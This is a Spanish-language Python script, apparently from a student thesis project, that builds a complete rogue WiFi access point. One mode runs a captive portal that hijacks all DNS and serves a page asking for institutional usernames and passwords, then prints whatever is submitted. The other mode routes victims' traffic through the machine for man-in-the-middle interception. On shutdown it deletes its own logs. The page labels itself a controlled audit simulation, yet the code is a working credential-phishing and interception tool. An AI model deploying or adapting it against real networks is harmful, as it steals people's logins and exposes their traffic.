import os, sys, subprocess, time, threading
from http.server import SimpleHTTPRequestHandler, HTTPServer

# --- SERVIDOR WEB INTEGRADO ---
class CaptivePortalHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        # Responde con éxito a las validaciones de conectividad de Android/iOS
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

        # HTML que verá el usuario en su pantalla
        html = """
        <!DOCTYPE html>
            <html lang="es">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Autenticación de Red - Portal Cautivo</title>
                <style>
                    * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
                    body { background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
                    .card { background: #ffffff; border-radius: 16px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2); width: 100%; max-width: 400px; padding: 40px 30px; text-align: center; }
                    .logo-area { margin-bottom: 25px; }
                    .logo-icon { font-size: 50px; color: #667eea; margin-bottom: 10px; }
                    h1 { font-size: 22px; color: #333333; font-weight: 600; margin-bottom: 8px; }
                    p { font-size: 14px; color: #666666; margin-bottom: 30px; line-height: 1.5; }
                    .academic-badge { display: inline-block; background-color: #e2e8f0; color: #4a5568; font-size: 11px; font-weight: bold; padding: 4px 12px; border-radius: 20px; margin-bottom: 20px; text-transform: uppercase; letter-spacing: 0.5px; }
                    .input-group { position: relative; margin-bottom: 20px; text-align: left; }
                    .input-group label { display: block; font-size: 12px; font-weight: 600; color: #4a5568; margin-bottom: 6px; text-transform: uppercase; }
                    input[type="text"], input[type="password"] { width: 100%; padding: 12px 16px; border: 2px solid #e2e8f0; border-radius: 8px; font-size: 15px; transition: all 0.3s ease; color: #2d3748; }
                    input[type="text"]:focus, input[type="password"]:focus { border-color: #667eea; outline: none; box-shadow: 0 0 0 3px rgba(102, 126, 234, 0.15); }
                    button[type="submit"] { width: 100%; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; padding: 14px; font-size: 16px; font-weight: 600; border-radius: 8px; cursor: pointer; margin-top: 10px; transition: transform 0.1s ease, box-shadow 0.3s ease; box-shadow: 0 4px 12px rgba(102, 126, 234, 0.3); }
                    button[type="submit"]:hover { box-shadow: 0 6px 20px rgba(102, 126, 234, 0.4); }
                    button[type="submit"]:active { transform: scale(0.98); }
                    .footer-text { font-size: 11px; color: #a0aec0; margin-top: 25px; line-height: 1.4; }
                </style>
            </head>
            <body>
                <div class="card">
                    <div class="logo-area">
                        <!-- Icono SVG simulando un escudo/candado corporativo institucional -->
                        <svg class="logo-icon" width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                            <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                            <path d="M12 8v4"></path>
                            <path d="M12 16h.01"></path>
                        </svg>
                    </div>
                
                    <span class="academic-badge">Entorno de Pruebas TFG</span>
                    <h1>Acceso a la Red WiFi</h1>
                    <p>Para continuar navegando, por favor introduce tus credenciales de acceso institucional.</p>
               
                    <form method="POST" action="/log">
                        <div class="input-group">
                            <label for="user">Usuario o Correo</label>
                            <input type="text" id="user" name="usuario" placeholder="ejemplo@universidad.edu" required autocomplete="username">
                        </div>
                    
                        <div class="input-group">
                            <label for="pass">Contraseña</label>
                            <input type="password" id="pass" name="contrasena" placeholder="••••••••" required autocomplete="current-password">
                        </div>
                   
                        <button type="submit">Iniciar Sesión y Conectar</button>
                    </form>
                
                    <div class="footer-text">
                        Esta es una simulación controlada de auditoría informática.<br>
                        Al conectar, aceptas los términos de uso de la infraestructura académica.
                    </div>
                </div>
            </body>
            </html>
        """
        self.wfile.write(bytes(html, "utf-8"))

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])

        post_data = self.rfile.read(content_length).decode('utf-8')

        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(bytes("<html><body><h2>[+] Datos recibidos en el laboratorio de pruebas. Puedes cerrar esta ventana.</h2></body></html>", "utf-8"))

        print("\n\r[ ALERTA MITM ] ¡El dispositivo móvil ha enviado datos a través del formulario web!")
        print(f"[+] Datos en bruto: {post_data}")

def iniciar_servidor_web(ip, puerto=80):
    # Arranca el servidor web en un hilo secundario para no congelar el script
    try:
        server = HTTPServer((ip, puerto), CaptivePortalHandler)
        server.serve_forever()
    except Exception as e:
        pass

# --- FLUJO PRINCIPAL DEL SCRIPT ---

def solicitar_datos_operador():
    # Fase 1: Solicitar al operador datos de personalización.
    print("=" * 50)
    print("     HERRAMIENTA UNIFICADA DE AUDITORÍA WIFI     ")
    print("=" * 50)

    print("Selecciona el modo de despliegue:")
    print("  1. Portal Cautivo (Aislamiento y Redirección Local)")
    print("  2. Enrutamiento de Internet (Navegación Real para MitM)")
    modo = input("[*] Elige una opción (1 o 2): ").strip()
    while modo not in ["1", "2"]:
        modo = input("[!] Opción inválida. Elige 1 o 2: ").strip()

    ssid = input("1. Introduce el NOMBRE de la red WiFi (SSID): ").strip()
    while not ssid:
        ssid = input("El SSID no puede estar vacío. Introduce un nombre: ").strip()

    password = input("2. Introduce la CONTRASEÑA WiFi (mínimo 8 caracteres) o pulsar ENTER para RED ABIERTA: ").strip()
    if password:
        while len(password) < 8:
            password = input("La contraseña debe tener al menos 8 caracteres (o pulsa ENTER para RED ABIERTA): ").strip()
            if not password:
                break

    interface_ap = input("3. Introduce la interfaz WiFi (ej. wlan0) [Por defecto: wlan0]: ").strip()
    if not interface_ap:
        interface_ap = "wlan0"

    interface_net = None
    if modo == "2":
        interface_net = input("4. Interfaz de tu PC que TIENE INTERNET (ej. eth0, eth1, wlan1): ").strip()
        while not interface_net:
            interface_net = input("[!] Debes especificar la interfaz con internet para el enrutamiento: ").strip()

    gateway_ip = input("4. IP para el Punto de Acceso [Por defecto: 192.168.4.1]: ").strip()
    if not gateway_ip:
        gateway_ip = "192.168.4.1"

    range_dhcp = input("5. Rango DHCP separado por coma [Por defecto: 192.168.4.10,192.168.4.50]: ").strip()
    if not range_dhcp:
        range_dhcp = "192.168.4.10,192.168.4.50"

    return {
        "modo": modo,
        "ssid": ssid,
        "password": password if password else None,
        "interface_ap": interface_ap,
        "interface_net": interface_net,
        "gateway": gateway_ip,
        "dhcp": range_dhcp
    }

def desplegar_punto_acceso(datos):
    # Fase 2: Genera configuraciones y levanta el Punto de Acceso con corrección de terminal.
    print("\n[+] Iniciando despliegue del entorno...")

    print(f"[*] Desvinculando interfaz {datos['interface_ap']} de NetworkManager...")
    subprocess.run(["sudo", "nmcli", "device", "set", datos['interface_ap'], "managed", "no"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 1. Detener servicios conflictivos
    print("[*] Deteniendo servicios previos...")
    subprocess.run(["sudo", "systemctl", "stop", "hostapd"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "systemctl", "stop", "dnsmasq"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "fuser", "-k", "80/tcp"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 2. Configurar la dirección IP estática
    print(f"[*] Asignando IP {datos['gateway']} a la interfaz {datos['interface_ap']}...")
    subprocess.run(["sudo", "ip", "addr", "flush", "dev", datos['interface_ap']])
    subprocess.run(["sudo", "ip", "addr", "add", f"{datos['gateway']}/24", datos['interface_ap']])
    subprocess.run(["sudo", "ip", "link", "set", datos['interface_ap'], "up"])

    # 3. Escribir configuración personalizada de hostapd
    print("[*] Generando configuración para hostapd...")
    config_hostapd = f"""interface={datos['interface_ap']}
driver=nl80211
ssid={datos['ssid']}
hw_mode=g
channel=7
wmm_enable=0
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
"""
    if datos['password']:
        config_hostapd += f"wpa=2\nwpa_passphrase={datos['password']}\nwpa_key_mgmt=WPA-PSK\nwpa_pairwise=TKIP\nrsn_pairwise=CCMP\n"
        modo_seguridad = "WPA2"
    else:
        modo_seguridad = "ABIERTA"

    with open("/tmp/hostapd_custom.conf", "w") as f:
        f.write(config_hostapd.strip())

    # 4. Escribir configuración personalizada de dnsmasq
    print("[*] Generando configuración para dnsmasq...")
    config_dnsmasq = f"""interface={datos['interface_ap']}
bind-interfaces
listen-address={datos['gateway']}
dhcp-range={datos['dhcp']},255.255.255.0,12h
dhcp-authoritative
dhcp-option=3,{datos['gateway']}
"""

    if datos['modo'] == "1":
        config_dnsmasq  += f"dhcp-option=6,{datos['gateway']}\naddress=/#/{datos['gateway']}\n"
        nombre_modo = "Portal Cautivo (Tráfico Secuestrado Localmente)"

        print("[*] Levantando Servidor HTTP del Portal Cautivo en el puerto 80...")
        web_thread = threading.Thread(target=iniciar_servidor_web, args=(datos['gateway'], 80))
        web_thread.daemon = True
        web_thread.start()
    else:
        config_dnsmasq += "dhcp-option=6,8.8.8.8,8.8.4.4\n"
        nombre_modo = "Enrutamiento (Internet Real para MitM)"
        print("[*] Habilitando IP Forwarding en el Kernel de Linux...")
        with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
            f.write("1")

        print(f"[*] Aplicando reglas NAT (Masquerade) hacia {datos['interface_net']}...")
        subprocess.run(["sudo", "nft", "add", "table", "ip", "nat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "nft", "add", "chain", "ip", "nat", "postrouting", "{ type nat hook postrouting priority 100 ; }"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        subprocess.run(["sudo", "nft", "add", "rule", "ip", "nat", "postrouting", "oifname", datos['interface_net'], "masquerade"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    with open("/tmp/dnsmasq_custom.conf", "w") as f:
        f.write(config_dnsmasq)

    print("[*] Configurando el cortafuegos para permitir tráfico DHCP y DNS...")
    subprocess.run(["sudo", "nft", "add", "table", "ip", "filtro_tfg"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "nft", "add", "chain", "ip", "filtro_tfg", "input", "{ type filter hook input priority 0 ; policy accept ; }"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    subprocess.run(["sudo", "nft", "add", "rule", "ip", "filtro_tfg", "input", "iifname", datos['interface_ap'], "udp", "dport", "{ 53, 67, 68 }", "accept"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

    # 5. Abrir archivos de log para almacenar los datos en segundo plano
    log_dnsmasq = open("/tmp/dnsmasq.log", "w")
    log_hostapd = open("/tmp/hostapd.log", "w")

    # 6. Lanzar los procesos redirigiendo su salida
    print("[+] Activando el servidor DHCP/DNS...")
    p_dnsmasq = subprocess.Popen(["sudo", "dnsmasq", "-C", "/tmp/dnsmasq_custom.conf", "-d"], stdout=log_dnsmasq, stderr=log_dnsmasq)

    time.sleep(1)

    print("[+] Activando la señal WiFi...")
    p_hostapd = subprocess.Popen(["sudo", "hostapd", "/tmp/hostapd_custom.conf"], stdout=log_hostapd, stderr=log_hostapd)
    
    # --- MEJORAR VISUALIZACIÓN DE DATOS ---
    time.sleep(1)
    subprocess.run(["tput", "sgr0"]) # Resetear atributos de texto de la terminal
    subprocess.run(["stty", "sane"]) # Restaurar lso modos de la terminal a valores estables

    # 7. Imprimir el banner estático
    print("\n" + "=" * 50)
    print("\r ¡ENTORNO DE AUDITORÍA ONLINE!")
    print(f"\rSSID (Red): {datos['ssid']}")
    print(f"\rSeguridad: {modo_seguridad}")
    if datos['password']:
        print(f"\rContraseña: {datos['password']}")
    print(f"\rIP de Gestión: {datos['gateway']}")
    if datos['modo'] == "2":
        print(f"Interfaz Internet: {datos['interface_net']}")
    print("\r" + "-" * 50)
    print("\rLogs guardados de manera limpia en /tmp/")
    print("\rPuedes ver los logs de conexiones en /tmp/dnsmasq.log")
    print("\rPresiona Ctrl+C en esta terminal para apagar el Punto de Acceso.")
    print("\r" + "=" * 50 + "\n")

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        # Volvemos a aplicar ssty sane por si el teclado interrumpe bruscamente
        subprocess.run(["stty", "sane"])
        print("\r[-] Apagando el Punto de Acceso y restaurando el sistema...")
    finally:
        # Finalización limpia de los servicios al salir
        p_hostapd.terminate()
        p_dnsmasq.terminate()
        subprocess.run(["sudo", "ip", "link", "set", datos['interface_ap'], "down"])

        print(f"[*] Devolviendo interfaz {datos['interface_ap']} a NetworkManager...")
        subprocess.run(["sudo", "nmcli", "device", "set", datos['interface_ap'], "managed", "yes"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        print(f"[*] Restaurando reglas del cortafuegos...")
        subprocess.run(["sudo", "nft", "delete", "table", "ip", "filtro_tfg"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        if datos['modo'] == "2":
            print("[*] Deshabilitando IP Forwarding...")
            with open("/proc/sys/net/ipv4/ip_forward", "w") as f:
                f.write("0")

            print("[*] Eliminando reglas NAT de nftables...")
            subprocess.run(["sudo", "nft", "delete", "table", "ip", "nat"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        # Cerrar los descriptores de archivos de log
        log_dnsmasq.close()
        log_hostapd.close()

        # Borrado de huellas finales
        for fichero in ["/tmp/hostapd_custom.conf", "/tmp/dnsmasq_custom.conf", "/tmp/dnsmasq.log", "/tmp/hostapd.log"]:
            if os.path.exists(fichero):
                os.remove(fichero)

        print("\r[+] Todo limpio y restaurado correctamente. ¡Adiós!")

if __name__ == "__main__":
    if sys.platform != "linux":
        print("[!] Error: Este script requiere un entorno Linux.")
        sys.exit(1)

    if os.geteuid() != 0:
        print("[!] Error: Debes ejecutar este script con privilegios de administrador (sudo).")
        sys.exit(1)

    datos_personalizados = solicitar_datos_operador()
    desplegar_punto_acceso(datos_personalizados)